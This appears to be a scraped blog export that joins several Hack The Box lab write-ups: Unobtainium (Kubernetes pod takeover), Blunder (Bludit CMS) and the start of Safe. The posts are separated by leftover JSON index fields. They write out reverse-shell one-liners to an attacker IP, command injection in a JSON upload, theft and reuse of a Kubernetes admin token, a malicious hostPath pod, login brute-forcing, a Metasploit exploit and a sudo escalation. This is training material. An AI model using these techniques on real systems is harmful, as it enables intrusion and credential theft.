[root:/git/htb/unobtainium]# echo eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ | base64 -d {“alg”:“RS256”,“kid”:“JNvob_VDLBvBVEiZBxpzN0oicDjYmhMT-wB5f-obVS8”}\nSECOND PART: [root:/git/htb/unobtainium]# echo eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ | base64 -d {“iss”:“kubernetes/serviceaccount”,“kubernetes.io/serviceaccount/namespace”:“default”,“kubernetes.io/serviceaccount/secret.name”:“default-token-gv2pq”,“kubernetes.io/serviceaccount/service-account.name”:“default”,“kubernetes.io/serviceaccount/service-account.uid”:“4083b502-e4dc-4fb0-b755-64fe7ded3715”,“sub”:“system:serviceaccount:default:default”}\nTHIRD PART: mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA\n\nEnumerate the pod further with deepce.sh and using kubectl.\n\nroot@webapp-deployment-5d764566f4-h5zhw:/dev/shm# wget http://10.10.14.2:4499/deepce.sh\nWe are unable to execute scripts in /dev/shm, probably because the ‘noexec’ option have been specified for that volume, so instead move the file to /tmp and execute it there.\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./deepce.sh .. ===================================( Enumerating Platform )=================================== [+] Inside Container …….. Yes [+] Container Platform …… kubentes [+] Container tools ……… None [+] User ……………….. root [+] Groups ……………… root .. ==================================( Enumerating Container )=================================== [+] Container ID ………… webapp-deployment-5d764566f4-h5zhw [+] Container Name ………. webapp-deployment-5d764566f4-h5zhw [+] Container IP ………… 172.17.0.10 [+] DNS Server(s) ……….. 10.96.0.10 [+] Host IP …………….. 172.17.0.1 [+] Useful tools installed .. Yes /usr/bin/curl /usr/bin/wget /usr/bin/gcc /bin/hostname /usr/bin/python /usr/bin/python2 /usr/bin/python3 .. ==================================( Enumerating Containers )================================== [+] Attempting ping sweep of 172.17.0.10 /24 (ping) 172.17.0.1 is Up 172.17.0.3 is Up 172.17.0.4 is Up 172.17.0.7 is Up 172.17.0.10 is Up 172.17.0.8 is Up 172.17.0.2 is Up 172.17.0.9 is Up 172.17.0.6 is Up 172.17.0.5 is Up\nNot much info to go on, but atleast it confirmed that we’re in a kubernetes platform, and gave us some IPs. Continue the enumeration by downloading/uploading Kubectl.\nDownload kubectl: [root:/git/htb/unobtainium]# curl -LO “https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl”\nTransfer it to the vicitm machine and install it: root@webapp-deployment-5d764566f4-h5zhw:/tmp# wget http://10.10.14.2:4499/kubectl root@webapp-deployment-5d764566f4-h5zhw:/tmp# install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl root@webapp-deployment-5d764566f4-h5zhw:/tmp# kubectl version –client Client Version: version.Info{Major:“1”, Minor:“22”, GitVersion:“v1.22.1”, GitCommit:“632ed300f2c34f6d6d15ca4cef3d3c7073412212”, GitTreeState:“clean”, BuildDate:“2021-08-19T15:45:37Z”, GoVersion:“go1.16.7”, Compiler:“gc”, Platform:“linux/amd64”}\nList the namespaces in the environment: root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl get namespaces ./kubectl get namespaces NAME STATUS AGE default Active 221d dev Active 220d kube-node-lease Active 221d kube-public Active 221d kube-system Active 221d\nList the pods in the different namespaces (note only dev is accessible): &lt;566f4-h5zhw:/tmp# ./kubectl get pods -n dev -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES devnode-deployment-cd86fb5c-6ms8d 1/1 Running 30 220d 172.17.0.6 unobtainium   devnode-deployment-cd86fb5c-mvrfz 1/1 Running 31 220d 172.17.0.4 unobtainium   devnode-deployment-cd86fb5c-qlxww 1/1 Running 31 220d 172.17.0.7 unobtainium  \nGather more information about one of the pods: root@webapp-deployment-5d764566f4-h5zhw:/opt# kubectl describe pod devnode-deployment-cd86fb5c-6ms8d -n dev Name: devnode-deployment-cd86fb5c-6ms8d Namespace: dev Priority: 0 Node: unobtainium/10.10.10.235 Start Time: Sun, 17 Jan 2021 18:16:21 +0000 Labels: app=devnode pod-template-hash=cd86fb5c Annotations:  Status: Running IP: 172.17.0.6 IPs: IP: 172.17.0.6 Controlled By: ReplicaSet/devnode-deployment-cd86fb5c Containers: devnode: Container ID: docker://d1036502420a410dabfbc7421bdb212d76c5ec5c469aa9eb3a6aaddcb2614249 Image: localhost:5000/node_server Image ID: docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c Port: 3000/TCP Host Port: 0/TCP State: Running Started: Thu, 26 Aug 2021 08:25:19 +0000 Last State: Terminated Reason: Error Exit Code: 137 Started: Mon, 26 Jul 2021 15:00:22 +0000 Finished: Mon, 26 Jul 2021 15:04:55 +0000 Ready: True Restart Count: 30 Environment:  Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro) Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled True Volumes: default-token-rmcd6: Type: Secret (a volume populated by a Secret) SecretName: default-token-rmcd6 Optional: false QoS Class: BestEffort Node-Selectors:  Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: \nWe can see the location of the image (localhost:5000/node_server), the running port (3000/TCP) and IP address (172.17.0.6). With all this information, we should investigate if it’s possible to create a new, malicious, pod or even move laterally to another pod using Kubernetes API auth module:\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl auth can-i exec pods no\n\nSo kubectl is not the way.. maybe we can access the dev-pods some other way. If we curl a dev-pod the response looks very much like our initials curls when probing the front-end.\n\nroot@webapp-deployment-5d764566f4-mbprj:/tmp# curl -v http://172.17.0.6:3000 * Rebuilt URL to: http://172.17.0.6:3000/ * Trying 172.17.0.6… * TCP_NODELAY set % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 –:–:– –:–:– –:–:– 0* Connected to 172.17.0.6 (172.17.0.6) port 3000 (#0) &gt; GET / HTTP/1.1 &gt; Host: 172.17.0.6:3000 &gt; User-Agent: curl/7.52.1 &gt; Accept: / &gt; &lt; HTTP/1.1 200 OK &lt; X-Powered-By: Express &lt; Content-Type: application/json; charset=utf-8 &lt; Content-Length: 2 &lt; ETag: W/“2-l9Fw4VUO7kr8CvBlt4zaMCqXZ0w” &lt; Date: Thu, 26 Aug 2021 13:06:28 GMT &lt; Connection: keep-alive &lt; Keep-Alive: timeout=5 &lt; { [2 bytes data] * Curl_http_done: called premature == 0 100 2 100 2 0 0 859 0 –:–:– –:–:– –:–:– 1000 * Connection #0 to host 172.17.0.6 left intact\nMaybe we can re-use the same exploit to get access to the dev-pods as well? Upload the cURL data-files (with new reverse port) and attack the dev-pod!\nroot@webapp-deployment-5d764566f4-mbprj:/usr/src/app# wget http://10.10.14.2:4499/user-upload.json root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# wget http://10.10.14.2:4499/user-reverse.json\nroot@webapp-deployment-5d764566f4-mbprj:/tmp# curl -v -X PUT 172.17.0.6:3000 -H “Content-Type: application/json” -d “@user-upload.json” .. &gt; PUT / HTTP/1.1 &gt; Host: 172.17.0.6:3000 &lt; HTTP/1.1 200 OK .. {“ok”:true}\nroot@webapp-deployment-5d764566f4-mbprj:/tmp# curl -v -X POST 172.17.0.6:3000/upload -H “Content-Type: application/json” -d “@user-reverse.json” .. &gt; POST /upload HTTP/1.1 &gt; Host: 172.17.0.6:3000 &lt; HTTP/1.1 200 OK .. {“ok”:true,“Uploaded_File”:“$(/bin/bash -c ‘bash -i &gt;& /dev/tcp/10.10.14.2/4400 0&gt;&1’)”}\n[root:/git/htb/unobtainium]# nc -lvnp 4400 (master✱) listening on [any] 4400 … connect to [10.10.14.2] from (UNKNOWN) [10.10.10.235] 41198 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# id && hostname uid=0(root) gid=0(root) groups=0(root) devnode-deployment-cd86fb5c-6ms8d\n\nWe successfully moved laterally and got access to the devnode! Redo our steps with kubectl and see if we can create a malicious pod now.\n\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# wget http://10.10.14.2:4499/kubectl root@devnode-deployment-cd86fb5c-6ms8d:/tmp# install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\nHowever, none of the previous steps work:\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl get namespaces Error from server (Forbidden): namespaces is forbidden: User “system:serviceaccount:dev:default” cannot list resource “namespaces” in API group “” at the cluster scope root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl get pods Error from server (Forbidden): pods is forbidden: User “system:serviceaccount:dev:default” cannot list resource “pods” in API group “” in the namespace “dev”\nFrom the webapp-pod we found several move namespaces, trying to get pods from each of them doesn’t work, neither can we exec pods: root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl auth can-i exec pods no\nAfter some random testing I came across this: root@devnode-deployment-cd86fb5c-6ms8d:/tmp# kubectl auth can-i list secrets -n kube-system yes\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl get secrets -n kube-system NAME TYPE DATA AGE attachdetach-controller-token-5dkkr kubernetes.io/service-account-token 3 221d bootstrap-signer-token-xl4lg kubernetes.io/service-account-token 3 221d c-admin-token-tfmp2 kubernetes.io/service-account-token 3 220d certificate-controller-token-thnxw kubernetes.io/service-account-token 3 221d clusterrole-aggregation-controller-token-scx4p kubernetes.io/service-account-token 3 221d coredns-token-dbp92 kubernetes.io/service-account-token 3 221d cronjob-controller-token-chrl7 kubernetes.io/service-account-token 3 221d daemon-set-controller-token-cb825 kubernetes.io/service-account-token 3 221d default-token-l85f2 kubernetes.io/service-account-token 3 221d deployment-controller-token-cwgst kubernetes.io/service-account-token 3 221d disruption-controller-token-kpx2x kubernetes.io/service-account-token 3 221d endpoint-controller-token-2jzkv kubernetes.io/service-account-token 3 221d endpointslice-controller-token-w4hwg kubernetes.io/service-account-token 3 221d endpointslicemirroring-controller-token-9qvzz kubernetes.io/service-account-token 3 221d expand-controller-token-sc9fw kubernetes.io/service-account-token 3 221d generic-garbage-collector-token-2hng4 kubernetes.io/service-account-token 3 221d horizontal-pod-autoscaler-token-6zhfs kubernetes.io/service-account-token 3 221d job-controller-token-h6kg8 kubernetes.io/service-account-token 3 221d kube-proxy-token-jc8kn kubernetes.io/service-account-token 3 221d namespace-controller-token-2klzl kubernetes.io/service-account-token 3 221d node-controller-token-k6p6v kubernetes.io/service-account-token 3 221d persistent-volume-binder-token-fd292 kubernetes.io/service-account-token 3 221d pod-garbage-collector-token-bjmrd kubernetes.io/service-account-token 3 221d pv-protection-controller-token-9669w kubernetes.io/service-account-token 3 221d pvc-protection-controller-token-w8m9r kubernetes.io/service-account-token 3 221d replicaset-controller-token-bzbt8 kubernetes.io/service-account-token 3 221d replication-controller-token-jz8k8 kubernetes.io/service-account-token 3 221d resourcequota-controller-token-wg7rr kubernetes.io/service-account-token 3 221d root-ca-cert-publisher-token-cnl86 kubernetes.io/service-account-token 3 221d service-account-controller-token-44bfm kubernetes.io/service-account-token 3 221d service-controller-token-pzjnq kubernetes.io/service-account-token 3 221d statefulset-controller-token-z2nsd kubernetes.io/service-account-token 3 221d storage-provisioner-token-tk5k5 kubernetes.io/service-account-token 3 221d token-cleaner-token-wjvf9 kubernetes.io/service-account-token 3 221d ttl-controller-token-z87px kubernetes.io/service-account-token 3 221d\nI have no clue of what to do with all these secrets, however we can see that one of them have a shorter age (220d) and the name seems very interesting: c-admin-token-tfmp2. Lets look at it!\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl describe secrets/c-admin-token-tfmp2 -n kube-system Name: c-admin-token-tfmp2 Namespace: kube-system Labels:  Annotations: kubernetes.io/service-account.name: c-admin kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0\nType: kubernetes.io/service-account-token\nData ==== token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow ca.crt: 1066 bytes namespace: 11 bytes\n\nThe next obvious step forward is to use this admin token to gather more information. Reading on kubernetes.io i find: &gt; “When using kubectl, use your id_token with the –token flag or add it directly to your kubeconfig”\n\nTo make the output a bit clearner, lets write the token to a variable and use that instead. root@devnode-deployment-cd86fb5c-6ms8d:/tmp# export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow &lt;TJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow\nLets try a simple POC if we can gather more information now with the use of the admin token. Previously we wasn’t able to get namespace information, however now we are! root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl –token=\\(TOKEN get namespaces\n    &lt;6ms8d:/tmp# ./kubectl --token=\\)TOKEN get namespaces NAME STATUS AGE default Active 221d dev Active 220d kube-node-lease Active 221d kube-public Active 221d kube-system Active 221d\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl –token=$TOKEN auth can-i exec pods yes\nNow we are able to exec pods, which probably means we’ll be able to get root.txt.\n\nCreate an malicious attacker.yaml file to escalate privilege with.\n\n[root:/git/htb/unobtainium]# cat attacker.yaml (master✱) apiVersion: v1 kind: Pod metadata: labels: run: attacker-pod name: attacker-pod namespace: default spec: volumes: - name: host-fs hostPath: path: / containers: - image: localhost:5000/node_server imagePullPolicy: Always name: attacker-pod volumeMounts: - name: host-fs mountPath: /root restartPolicy: Never\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# wget http://10.10.14.2:4499/attacker.yaml root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl –token=\\(TOKEN apply -f attacker.yaml\n    pod/attacker-pod created\n  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl --token=\\)TOKEN exec -it attacker-pod -n default – bash Unable to use a TTY - input is not a terminal or the right kind of file id && hostname uid=0(root) gid=0(root) groups=0(root) attacker-pod cat root.txt 59538ae4da62a3871d1cb220284bcda6\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPrototype Pollution: https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/ https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution\nBash Variable Substitution: https://unix.stackexchange.com/questions/312702/bash-variable-substitution-in-a-json-string\nInstall kubectl: https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux\nKubernetes kubectl commands: https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod https://kubernetes.io/docs/reference/access-authn-authz/authorization/ https://book.hacktricks.xyz/pentesting/pentesting-kubernetes\nKubectl token: https://kubernetes.io/docs/reference/access-authn-authz/authentication/"
  },
  {
    "objectID": "posts/2020-06-04-htb-writeup-blunder/2020-06-04-htb-writeup-blunder.html",
    "href": "posts/2020-06-04-htb-writeup-blunder/2020-06-04-htb-writeup-blunder.html",
    "title": "Blunder - Hack The Box",
    "section": "",
    "text": "██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb/cache# nmap -Pn -sC -sV -n 10.10.10.191 PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts\nDIRB:\n\nhttp://10.10.10.191/0 (CODE:200|SIZE:7562)\nhttp://10.10.10.191/about (CODE:200|SIZE:3281) ==&gt; DIRECTORY: http://10.10.10.191/admin/\nhttp://10.10.10.191/cgi-bin/ (CODE:301|SIZE:0)\nhttp://10.10.10.191/LICENSE (CODE:200|SIZE:1083)\nhttp://10.10.10.191/robots.txt (CODE:200|SIZE:22)\nhttp://10.10.10.191/server-status (CODE:403|SIZE:277)\n\nNIKTO:\n\n“robots.txt” contains 1 entry which should be manually viewed.\n\nFFUF dirb/common.txt (.php, .html, .txt): install.php [Status: 200, Size: 30, Words: 5, Lines: 1] robots.txt [Status: 200, Size: 22, Words: 3, Lines: 2] todo.txt [Status: 200, Size: 118, Words: 20, Lines: 5]\nLooking at the webpage we find nothing really of use. Dirb gives us a login under /admin, however we don’t have any creds. install.php only says that Bludit is already installed robots.txt hows nothing todo.txt however gives us something;\n-Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING\n\nMy conclusion from this - CMS is old version, and there are probably a user named fergus.\n\nLooking through the source code of the webpage we find that the software version is 3.9.2.\n \n\nLooking for vulnerabilities in Bludit 3.9.2 we find a page and a script to bypass brute force protection. https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb\nEnter found username (fergus), along with the url and standard wordlist rockyou.txt - no dice. We’re missing something here the password doesn’t seem the be a default from rockyou.txt.\nUsing cewl we can try to create our own, custom, wordlist. root@nidus:/git/htb/blunder# cewl -w blunder-wl.txt -d 4 -m 5 http://10.10.10.191 root@nidus:/git/htb/blunder# cat brute.py #!/usr/bin/env python3 import re import requests\n  host = \"http://10.10.10.191\" # change to the appropriate URL\n\n  login_url = host + '/admin/'\n  username = 'fergus' # Change to the appropriate username\n  fname = \"blunder-wl.txt\" #change this to the appropriate file you can specify the full path to the file\n  ..\n\nroot@nidus:/git/htb/blunder# python3 brute.py\n  ..\n  [*] Trying: RolandDeschain\n\n  SUCCESS: Password found!\n  Use fergus:RolandDeschain to login.\n\nWe are now able to access /admin. Continue to enumerate for Bludit 3.9.2 vulns and we find a Code Execution vuln in the upload function.\nhttps://github.com/bludit/bludit/issues/1081 I tried to get this exploit to work manually, however I wasn’t able to. So instead I went to the msf module ‘linux/http/bludit_upload_images_exec’ that gave a reverse meterpreter shell right away.\nmsf5 exploit(linux/http/bludit_upload_images_exec) &gt; options\nModule options (exploit/linux/http/bludit_upload_images_exec):\nName        Current Setting      Required  Description\n----        ---------------      --------  -----------\nBLUDITPASS  RolandDeschain       yes       The password for Bludit\nBLUDITUSER  fergus               yes       The username for Bludit\nProxies                          no        A proxy chain of format type:host:port[,type:host:port][...]\nRHOSTS      10.10.10.191         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\nRPORT       80                   yes       The target port (TCP)\nSSL         false                no        Negotiate SSL/TLS for outgoing connections\nTARGETURI   /                    yes       The base path for Bludit\nVHOST                            no        HTTP server virtual host\nmsf5 exploit(linux/http/bludit_upload_images_exec) &gt; run\n[*] Started reverse TCP handler on 10.10.14.17:4488 [+] Logged in as: fergus [*] Retrieving UUID… [*] Uploading umtMhoBAyo.png… [*] Uploading .htaccess… [*] Executing umtMhoBAyo.png… [*] Sending stage (38288 bytes) to 10.10.10.191 [*] Meterpreter session 1 opened (10.10.14.17:4488 -&gt; 10.10.10.191:53692) at 2020-06-04 17:53:55 +0200 [+] Deleted .htaccess\nmeterpreter &gt; shell Process 4654 created. Channel 1 created. whoami www-data\nLooking around in the box we find 2 hashed passwords in /var/www/bludit-3.9.2/bl-content/databases, however we are unable to crack them. Enumerating further we find their new, updated version bludit 3.10 directory. Browsing to the database dir we find a new user hash.\npwd /var/www/bludit-3.10.0a/bl-content/databases cat users.php  { “admin”: { “nickname”: “Hugo”, “firstName”: “Hugo”, “lastName”: ““,”role”: “User”, “password”: “faca404fd5c0a31cf1897b823c695c85cffeb98d”,\nrockyou.txt doesn’t contain the password, so using crackstation.net solved it for us - Password120\nsu hugo Password: Password120 whoami hugo cat /home/hugo/user.txt 7648136cd484168abf3ba60f6687fe65\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nThe reverse meterpreter shell won’t allow us to execute ‘sudo -l’, so start by creating a new reverse shell - and upgrade it.\nbash -i &gt;& /dev/tcp/10.10.14.17/4488 0&gt;&1 root@nidus:/git/htb/blunder# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.17] from (UNKNOWN) [10.10.10.191] 54502 bash: cannot set terminal process group (1093): Inappropriate ioctl for device bash: no job control in this shell hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$\nhugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l Password: Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser hugo may run the following commands on blunder: (ALL, !root) /bin/bash\nA quick google on ‘(ALL, !root) /bin/bash’ shows us that we can escalate privs using ‘sudo -u#-1 /bin/bash’\nhugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash root@blunder:/var/www/bludit-3.10.0a/bl-content/databases# whoami root root@blunder:/var/www/bludit-3.10.0a/bl-content/databases# cat /root/root.txt 4f812395afcaa35870cc99487a7ef108\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝"
  },
  {
    "objectID": "posts/2020-02-17-htb-writeup-safe/2020-02-17-htb-writeup-safe.html",
    "href": "posts/2020-02-17-htb-writeup-safe/2020-02-17-htb-writeup-safe.html",
    "title": "Safe - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\nNOTE: If you have no experience doing binex try some simple BOF tutorials, do some BOFs on your own machine and try to understand exactly what is going on. Then move on to simple ROP tutorials. Then finally apply what you’ve learned to the binary on your own machine.\nIPSec guide on Bitterman: https://www.youtube.com/watch?v=6S4A2nhHdWg\n\nnmap -Pn -sC -sV -O 10.10.10.147 (samt -p-) 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) 80/tcp open http Apache httpd 2.4.25 ((Debian)) 1337/tcp open waste\nLook at the Source of the Debian Default Page (port 80), on the top there’s a comment. 